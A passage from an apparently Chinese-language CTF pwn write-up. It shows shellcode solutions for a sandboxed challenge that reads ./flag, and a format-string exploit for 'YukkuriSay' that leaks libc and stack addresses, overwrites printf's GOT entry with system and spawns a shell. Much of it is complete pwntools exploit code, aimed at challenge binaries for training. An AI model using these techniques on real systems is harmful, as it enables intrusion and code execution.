<strong>0xCAFE0000处占有0x6空间的指令，需要跳过</strong></p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = flat([<br>    asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov esi, edx</span><br><span class="hljs-string">xor edi, edi</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span>)<br>])<br>sendline_after_clean(payload)<br><br><span class="hljs-comment"># 生成orw的shellcode</span><br>payload = flat([<br>    asm(<span class="hljs-string">&quot;nop&quot;</span>)*<span class="hljs-number">0x6</span>,<br>    asm(shellcraft.cat(<span class="hljs-string">&quot;./flag&quot;</span>))<br>])<br></code></pre></td></tr></table></figure><p><strong>目的：是往0xcafe0000地址处，继续写东西</strong></p><h3 id="解法2：利用call特性"><a href="#解法2：利用call特性" class="headerlink" title="解法2：利用call特性"></a>解法2：利用call特性</h3><p><strong>call指令会将下一条指令的地址，push进栈，因此我们可以利用栈中的数据跳转到main函数的任意位置</strong></p><p>所以，只要设置好rsi的值，通过pop 到某寄存器，再jmp该寄存器，到main函数中read函数调用处，实现目的</p><p><strong>shellcode前寄存器状态</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs assembly"> RAX  0x0<br> RBX  0x55646e0553d0 (__libc_csu_init) ◂— endbr64 <br> RCX  0x7f0d9feeed3e (prctl+14) ◂— cmp    rax, -0xfff<br> RDX  0xcafe0000 ◂— mov    rsi, rdx /* 0x24242c8348d68948 */<br> RDI  0x16<br> RSI  0x2<br> R8   0x0<br> R9   0x0<br> R10  0x7f0d9feeed3e (prctl+14) ◂— cmp    rax, -0xfff<br> R11  0x217<br> R12  0x55646e055100 (_start) ◂— endbr64 <br> R13  0x7ffef8370030 ◂— 0x1<br> R14  0x0<br> R15  0x0<br> <br>mov rax, 0 #已经满足<br>mov rdi, 0 <br>mov rsi, 0xCAFE0000<br>mov rdx, 0x100<br>syscall<br></code></pre></td></tr></table></figure><p><strong>Gadget</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:000000000000138B 48 8B 45 F8                   mov     rax, [rbp+buf]<br>.text:000000000000138F BA 10 00 00 00                mov     edx, 10h                        ; nbytes<br>.text:0000000000001394 48 89 C6                      mov     rsi, rax                        ; buf<br><br>.text:0000000000001397 BF 00 00 00 00                mov     edi, 0                          ; fd<br>.text:000000000000139C B8 00 00 00 00                mov     eax, 0<br>.text:00000000000013A1 E8 2A FD FF FF                call    _read<br>.text:00000000000013A1<br>.text:00000000000013A6 B8 00 00 00 00                mov     eax, 0<br>.text:00000000000013AB E8 9E FE FF FF                call    sandbox<br>.text:00000000000013AB<br>.text:00000000000013B0 48 8B 55 F8                   mov     rdx, [rbp+buf]<br>.text:00000000000013B4 B8 00 00 00 00                mov     eax, 0<br>.text:00000000000013B9 FF D2                         call    rdx<br>.text:00000000000013B9<br>.text:00000000000013BB B8 00 00 00 00                mov     eax, 0<br>.text:00000000000013C0 C9                            leave<br>.text:00000000000013C1 C3                            retn<br></code></pre></td></tr></table></figure><p><strong>shellcode</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov esi, edx  #设esi为0xcafe0000<br>pop r15       #记录上一条指令的地址<br>sub r15, 0x24 #计算指令地址到0x1397<br>jmp r15<br></code></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = flat([<br>    asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov esi, edx  </span><br><span class="hljs-string">    pop r15       </span><br><span class="hljs-string">    sub r15, 0x24 </span><br><span class="hljs-string">    jmp r15</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span>)<br>])<br>pause()<br>sa(<span class="hljs-string">b&#x27;shellcode:&#x27;</span>, payload)<br><br><br><span class="hljs-comment"># 生成orw的shellcode</span><br>payload = flat([<br>    asm(shellcraft.cat(<span class="hljs-string">&quot;./flag&quot;</span>))<br>])<br>pause()<br>s(payload)<br></code></pre></td></tr></table></figure><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>解法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>libc = cdll.LoadLibrary(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br>banary = <span class="hljs-string">&quot;./vuln&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;1&#x27;</span><br>port = <span class="hljs-number">1</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>p = process(banary)<br><span class="hljs-keyword">else</span>:<br>p = remote(ip, port)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(p)<br>pause()<br><br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br><br>payload = flat([<br>    asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov esi, edx</span><br><span class="hljs-string">    xor edi, edi</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span>)<br>])<br><span class="hljs-comment">#pause()</span><br>sa(<span class="hljs-string">b&#x27;shellcode:&#x27;</span>, payload)<br><br>payload = flat([<br>    asm(<span class="hljs-string">&quot;nop&quot;</span>)*<span class="hljs-number">0x6</span>,<br>    asm(shellcraft.cat(<span class="hljs-string">&quot;./flag&quot;</span>))<br>])<br><span class="hljs-comment">#pause()</span><br>s(payload)<br><br>pi()<br></code></pre></td></tr></table></figure><h2 id="4-YukkuriSay"><a href="#4-YukkuriSay" class="headerlink" title="4.YukkuriSay"></a>4.YukkuriSay</h2><p><strong>HINTS:</strong></p><p><strong>格式化占位符的值来自于函数的参数，同时64位程序传参不是只用寄存器</strong></p><p><strong>%n占位符是存在溢出的</strong></p><h3 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h3><h4 id="偏移"><a href="#偏移" class="headerlink" title="偏移"></a><strong>偏移</strong></h4><p><strong>linux下32位程序是栈传参，从左到右参数顺序为$esp+4,$esp+8,…；因此$esp+x的位置应该是格式化第x&#x2F;4个参数。</strong><br><strong>linux下64位程序是寄存器加栈传参，从左到右参数顺序为$rdi,$rsi,$rdx,$rcx,$r8,$r9,$rsp+8,…；因此$rsp+x的位置应该是格式化第x&#x2F;8+6个参数。</strong></p><h4 id="符号"><a href="#符号" class="headerlink" title="符号"></a><strong>符号</strong></h4><p><strong>用于地址泄露</strong>：%x、%s、%p等；</p><p><strong>用于地址写：</strong></p><ol><li><p>%hhn（写入一字节），%hn（写入两字节），%n（32位写四字节，64位写8字节）；</p></li><li><p>%&lt; number&gt;$type：直接作用第number个位置的参数，如：%7$x读第7个位置参数值，%7$n对第7个参数位置进行写。</p></li><li><p>%&lt; number&gt;c：输出number个字符，配合%n进行任意地址写，例如”%{}c%{}$hhn”.format(address,offset)就是向offset0参数指</p><p>向的地址最低位写成address。</p></li></ol><p><strong>栈上格式化字符串漏洞</strong>：先泄露地址，包括ELF程序地址和libc地址，然后将需要改写的GOT表地址直接传到栈上，同时利用<code>%c%n</code>的方法改写入<code>system或one_gadget</code>地址，最后就是劫持流程。</p><p><strong>非栈上(bss段的)格式化字符串漏洞</strong></p><p>不能直接布栈，再劫持程序流实现，所以需要借助跳板。</p><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p><strong>在循环内输入的内容存于栈上，且循环中的print_str可以输出栈上内容，跳出循环后，存在一个bss段的格式化字符串漏洞</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+8h] [rbp-118h]</span><br>  <span class="hljs-type">char</span> s1[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+Ch] [rbp-114h] BYREF</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">264</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-110h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+118h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What would you like to let Yukkri say?&quot;</span>);<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    v1 = read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x100</span>uLL);<br>    <span class="hljs-keyword">if</span> ( buf[v1 - <span class="hljs-number">1</span>] == <span class="hljs-number">10</span> )<br>      buf[v1 - <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>    print_str(buf);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;anything else?(Y/n)&quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%2s&quot;</span>, s1);<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-built_in">strcmp</span>(s1, <span class="hljs-string">&quot;n&quot;</span>) &amp;&amp; <span class="hljs-built_in">strcmp</span>(s1, <span class="hljs-string">&quot;N&quot;</span>) );<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Yukkri prepared a gift for you: &quot;</span>);<br>  read(<span class="hljs-number">0</span>, str, <span class="hljs-number">0x100</span>uLL);<br>  <span class="hljs-built_in">printf</span>(str);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h4 id="算偏移"><a href="#算偏移" class="headerlink" title="算偏移"></a><strong>算偏移</strong></h4><p><strong>$rsp+x的位置应该是格式化第x&#x2F;8+6个参数。</strong></p><p><img src="/../md/14.png" alt="在这里插入图片描述"></p><p><strong>输入处在rsp+16，所以偏移为16&#x2F;8 + 6 &#x3D;&#x3D; 8！！！</strong></p><p><img src="/../md/15.png" alt="在这里插入图片描述"></p><ol><li><strong>泄露libc地址</strong></li><li><strong>泄露栈地址（调试出来，看栈上内容）</strong></li><li><strong>布栈</strong></li><li><strong>改Got值</strong></li><li><strong>getshell</strong></li></ol><h4 id="布栈"><a href="#布栈" class="headerlink" title="布栈"></a><strong>布栈</strong></h4><p>我们格式化字符串用%hhn替换<strong>需要从小到大排序</strong>（因为在后面的会包含前面的数量）</p><p>所以可以考虑将printf分为两次修改，一次修改一个字节，一次修改两个字节，而修改返回地址也需要修改两个字节</p><p>因此prinft的got地址肯定是放在最前面的，而通过一开始的泄露我们可以知道修改printf的两个字节要放在修改返回地址的后面</p><p><strong>将栈设置为：</strong><code>printf_got + stack_addr+280(ret) + printf_got+1</code></p><p><strong>此时：</strong></p><p><strong>偏移8：栈1，printf_got</strong></p><p><strong>偏移9：栈2，ret_main</strong></p><p><strong>偏移10：栈3，printf_got + 1</strong></p><h4 id="改地址"><a href="#改地址" class="headerlink" title="改地址"></a>改地址</h4><p><strong>定位到printf的got地址，通过格式化字符串漏洞实现任意地址写，实现覆盖printf_got为system</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">sys1=system&amp;<span class="hljs-number">0xff</span>   <span class="hljs-comment"># system的低一字节</span><br>sys2=(system&gt;&gt;<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0xffff</span>  <span class="hljs-comment"># system的低二三字节</span><br>gift_addr=gift&amp;<span class="hljs-number">0xffff</span>    <span class="hljs-comment"># gift的低二字节</span><br><span class="hljs-built_in">print</span>(sys1)<br><span class="hljs-built_in">print</span>(sys2)<br><span class="hljs-built_in">print</span>(gift_addr)<br><br>payload3 =  <span class="hljs-string">&#x27;%&#x27;</span>+ <span class="hljs-built_in">str</span>(sys1 )+ <span class="hljs-string">&#x27;c%8$hhn&#x27;</span><br>payload3 += <span class="hljs-string">&#x27;%&#x27;</span>+ <span class="hljs-built_in">str</span>((gift_addr)- (sys1)) + <span class="hljs-string">&#x27;c%9$hn&#x27;</span><br>payload3 += <span class="hljs-string">&#x27;%&#x27;</span>+ <span class="hljs-built_in">str</span>(sys2-gift_addr)   + <span class="hljs-string">&#x27;c%10$hn&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>相减是因为后面地址替换的数量有包含前面已经替换的数量</strong></p><p><strong>右移8是因为两位十六进制数就是八位二进制数</strong></p><p><strong>执行前：</strong></p><p><img src="/../md/16.png" alt="在这里插入图片描述"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs llvm">[*]  pri --&gt;    <span class="hljs-number">0x7fddc51a7c90</span> <br>[*]  system --&gt; <span class="hljs-number">0x7fddc5198290</span><br><br>sys<span class="hljs-number">1</span>: <span class="hljs-number">144</span> &#x27;\<span class="hljs-keyword">x</span><span class="hljs-number">90</span>&#x27;<br>sys<span class="hljs-number">2</span>:<span class="hljs-number">6530</span> &#x27;\<span class="hljs-keyword">x</span><span class="hljs-number">19</span>\<span class="hljs-keyword">x</span><span class="hljs-number">82</span>&#x27;<br><span class="hljs-symbol">gift:</span><span class="hljs-number">5745</span> &#x27;\<span class="hljs-keyword">x</span><span class="hljs-number">16</span>\<span class="hljs-keyword">x</span><span class="hljs-number">71</span>&#x27;<br><br><span class="hljs-variable">%144</span>  <span class="hljs-keyword">c</span><span class="hljs-variable">%8</span>$hhn <br><span class="hljs-variable">%5601</span> <span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>$hn <br><span class="hljs-variable">%785</span>  <span class="hljs-keyword">c</span><span class="hljs-variable">%10</span>$hn<br></code></pre></td></tr></table></figure><p><strong>通过偏移定位，布栈的时候是将printf的got地址分成两部分进行写入，第一次偏移8，修改末位字节，第二次偏移9，修改ret地址，第三次偏移10，修改printf的低二三字节</strong></p><p><strong>执行后</strong></p><p><img src="/../md/17.png" alt="在这里插入图片描述"></p><h3 id="解法1-常规"><a href="#解法1-常规" class="headerlink" title="解法1: 常规"></a>解法1: 常规</h3><p><strong>获取栈地址后更改返回地址和printf的got值</strong></p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br>banary = <span class="hljs-string">&quot;./vuln&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;1&#x27;</span><br>port = <span class="hljs-number">1</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>p = process(banary)<br><span class="hljs-keyword">else</span>:<br>p = remote(ip, port)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(p)<br>pause()<br><br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><br><br><span class="hljs-comment">#--------------------1.leak_libc--------------------</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xe0</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x8</span><br>sa(<span class="hljs-string">&#x27;What would you like to let Yukkri say?&#x27;</span>,payload)<br><br>libc_base=u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))-libc.symbols[<span class="hljs-string">&#x27;setbuffer&#x27;</span>]-<span class="hljs-number">204</span> <br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br><span class="hljs-comment">#pause()</span><br><br><span class="hljs-comment">#--------------------2.leak_stack--------------------</span><br>sla(<span class="hljs-string">b&#x27;else?(Y/n)&#x27;</span>,<span class="hljs-string">b&#x27;Y&#x27;</span>)<br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xf8</span> + <span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">0x8</span><br>s(payload1)<br><br>ru(<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">5</span>)<br>stack_addr= u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)) - <span class="hljs-number">0x120</span><br>lg(<span class="hljs-string">&#x27;stack_addr&#x27;</span>)<br><br><span class="hljs-comment">#--------------------3.make_stack --------------------</span><br>sla(<span class="hljs-string">b&#x27;else?(Y/n)&#x27;</span>,<span class="hljs-string">b&#x27;Y&#x27;</span>)<br><br>pri=libc_base+libc.symbols[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>system=libc_base+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>print_got=elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><br>lg(<span class="hljs-string">&#x27;pri&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;system&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;print_got&#x27;</span>)<br><br><span class="hljs-comment">#stack_addr+280 --&gt; rbp+8(ret) --&gt; main</span><br>payload=p64(print_got) + p64(stack_addr+<span class="hljs-number">280</span>) + p64(print_got+<span class="hljs-number">1</span>)<br>s(payload)<br><br><span class="hljs-comment">#-------------------- 4.print_got --&gt; system --------------------</span><br>sla(<span class="hljs-string">&#x27;else?(Y/n)&#x27;</span>,<span class="hljs-string">b&#x27;n&#x27;</span>)<br><br>gift= <span class="hljs-number">0x401671</span><br>sys1 = system &amp; <span class="hljs-number">0xff</span>         <br>sys2 = (system&gt;&gt;<span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xffff</span>  <br>gift_addr = gift &amp; <span class="hljs-number">0xffff</span> <br><span class="hljs-built_in">print</span>(sys1)<br><span class="hljs-built_in">print</span>(sys2)<br><span class="hljs-built_in">print</span>(gift_addr)<br><br>payload3 =  <span class="hljs-string">&#x27;%&#x27;</span>+ <span class="hljs-built_in">str</span>(sys1 ) + <span class="hljs-string">&#x27;c%8$hhn&#x27;</span><br>payload3 += <span class="hljs-string">&#x27;%&#x27;</span>+ <span class="hljs-built_in">str</span>((gift_addr)- (sys1)) + <span class="hljs-string">&#x27;c%9$hn&#x27;</span><br>payload3 += <span class="hljs-string">&#x27;%&#x27;</span>+ <span class="hljs-built_in">str</span>(sys2-gift_addr)   + <span class="hljs-string">&#x27;c%10$hn&#x27;</span><br><br>debug()<br><br>pause()<br><br>sa(<span class="hljs-string">&#x27;gift for you: \n&#x27;</span>,payload3)<br>sleep(<span class="hljs-number">0.5</span>)<br><br>pause()<br><br>s(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br>pi()<br></code></pre></td></tr></table></figure><h3 id="解法2："><a href="#解法2：" class="headerlink" title="解法2："></a>解法2：</h3><p><strong>利用setbuffer函数泄露libc, 更改stack_check_fail的got为后门，触发canary，调用stack_check_fail</strong></p><p><a href="https://peterliuzhi.top/writeup/hgame-week2-pwn-writeup/#exp-1">https://peterliuzhi.top/writeup/hgame-week2-pwn-writeup/#exp-1</a></p><h4 id="贴个exp"><a href="#贴个exp" class="headerlink" title="贴个exp"></a>贴个exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span 